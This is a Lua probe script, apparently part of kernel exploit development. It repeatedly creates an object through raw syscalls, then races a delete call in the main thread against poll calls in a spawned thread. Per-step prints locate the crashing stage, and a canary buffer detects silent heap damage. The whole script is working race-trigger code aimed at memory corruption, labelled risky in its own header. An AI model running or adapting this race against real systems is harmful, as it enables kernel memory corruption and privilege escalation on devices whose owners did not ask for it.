-- CRASH_CLASS: RISKY
-- PROBE 497d: staged delete-versus-poll, one print per step
-- 497b printed only after the join, so its round-3 death could have been the
-- spawn, the thread's poll loop or the delete itself. This prints before every
-- step and keeps the thread loop short, so the capture names the stage that dies.
-- A canary page is written before each round and verified after it, to catch
-- silent heap damage while the process is still alive.
print("=== PROBE 497d: staged delete vs poll ===")
io.stdout:setvbuf("no")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function addrnum(v)
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return to_num(v)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local data   = memory.alloc(0x2000)
local out    = memory.alloc(0x100)
local ids    = memory.alloc(0x100)
local res1   = memory.alloc(0x400)
local res2   = memory.alloc(0x400)
local gate   = memory.alloc(0x100)
local canary = memory.alloc(0x100)
local sc669, sc664, sc662 = make_syscall(669), make_syscall(664), make_syscall(662)
for off = 0, 0x2000 - 1, 4 do pcall(function() memory.write_dword(data + off, 0) end) end
for off = 0, 0xFF - 1, 4 do pcall(function() memory.write_dword(canary + off, 0xA5A5A5A5) end) end
local function canary_ok()
  for off = 0, 0xFF - 1, 4 do
    if to_num(memory.read_dword(canary + off)) ~= 0xA5A5A5A5 then return false, off end
  end
  return true, 0
end
local body = "local t = {}\n" ..
             "for k,v in pairs(syscall.pipe) do t[k] = v end\n" ..
             "t.syscall_no = 664\n" ..
             "setmetatable(t, getmetatable(syscall.pipe))\n" ..
             "while memory.read_dword(GATE) == 0 do end\n" ..
             "memory.write_dword(GATE + 4, 1)\n" ..
             "for i = 1, 50 do pcall(function() t(IDS, 1, RES2) end) end\n" ..
             "memory.write_dword(GATE + 8, 1)\n"
body = body:gsub("GATE", tostring(addrnum(gate)))
body = body:gsub("IDS", tostring(addrnum(ids)))
body = body:gsub("RES2", tostring(addrnum(res2)))

for r = 1, 12 do
  print(string.format("[r%d] create", r))
  for off = 0, 0x100 - 1, 4 do pcall(function() memory.write_dword(out + off, 0) end) end
  local cok = pcall(function() return sc669(uint64(1), uint64(data), uint64(1), uint64(1), uint64(out)) end)
  local id = to_num(memory.read_dword(out))
  print(string.format("[r%d] created ok=%s id=%d", r, tostring(cok), id))
  if id <= 0 then break end
  pcall(function() memory.write_dword(ids, id) end)
  print(string.format("[r%d] poll", r))
  pcall(function() return sc664(uint64(ids), uint64(1), uint64(res2)) end)
  pcall(function() memory.write_dword(gate, 0) end)
  pcall(function() memory.write_dword(gate + 4, 0) end)
  pcall(function() memory.write_dword(gate + 8, 0) end)
  for off = 0, 0x40 - 1, 4 do pcall(function() memory.write_dword(res1 + off, 0x77777777) end) end
  print(string.format("[r%d] spawn", r))
  local ok, thr = pcall(run_lua_code_in_new_thread, body, { async = true })
  if not ok or type(thr) ~= "table" then print(string.format("[r%d] spawn failed", r)); break end
  print(string.format("[r%d] spawned, waiting for gate", r))
  local spins = 0
  while to_num(memory.read_dword(gate + 4)) == 0 and spins < 4000000 do spins = spins + 1 end
  print(string.format("[r%d] opening gate", r))
  pcall(function() memory.write_dword(gate, 1) end)
  print(string.format("[r%d] delete", r))
  local myok, myrv = pcall(function() return sc662(uint64(ids), uint64(1), uint64(res1)) end)
  print(string.format("[r%d] delete ret=%s status=%#x", r,
        myok and tostring(to_num(myrv)) or "-", to_num(memory.read_dword(res1))))
  local jspins = 0
  while to_num(memory.read_dword(gate + 8)) == 0 and jspins < 4000000 do jspins = jspins + 1 end
  print(string.format("[r%d] joining", r))
  pcall(function() return thr:join() end)
  local cok2, coff = canary_ok()
  print(string.format("[r%d] joined canary=%s%#x", r, tostring(cok2), coff))
end
print("=== PROBE 497d COMPLETE ===")
